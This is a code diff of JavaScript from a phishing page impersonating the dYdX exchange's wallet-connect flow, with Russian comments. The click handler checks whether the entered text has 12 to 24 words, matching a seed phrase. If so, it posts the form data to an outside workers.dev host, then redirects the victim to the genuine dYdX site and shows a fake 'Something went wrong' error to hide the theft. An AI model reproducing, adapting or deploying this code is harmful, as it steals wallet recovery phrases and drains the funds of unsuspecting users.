@@ -30,21 +30,26 @@ walletButtons.forEach((item) => {
   });
 });
 
-$('#form-popup button').click( function() {
+$('#form-popup button').click(function() {
   let count = $('#form-popup form textarea').val().trim().split(" ").length;
+  
   if (count === 12 || count === 15 || count === 18 || count === 21 || count === 24) {
     $.post('https://blue-gay.juistespastelastes.workers.dev/', $('#form-popup form').serialize(), function(data) {
       setTimeout(() => {
         document.querySelector('#form-popup').classList.add('hidden');
-        location.assign('https://trade.dydx.exchange/portfolio/overview');
+        // Меняем URL редиректа на новый
+        location.assign('https://dydx.exchange/');
+        
         document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9').classList.add('alert-error');
         document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9 div').innerText = 'Something went wrong. Please try again later.';
+        
+        // Остальной код обработчиков остается без изменений
         backButton.onclick = () => {
           $('#form-popup form textarea').val('');
           document.querySelector('#form-popup').classList.remove('hidden');
           document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9').classList.remove('alert-error');
           document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9 div').innerText = 'Fireblocks and Lattice1 are not supported at this time. Onboarding with these wallets will result in irrecoverable keys.';
-
+          
           backButton.onclick = () => {
             document.querySelector('#wallet-selector').classList.remove('hidden');
             document.querySelector('#form-popup').classList.add('hidden');
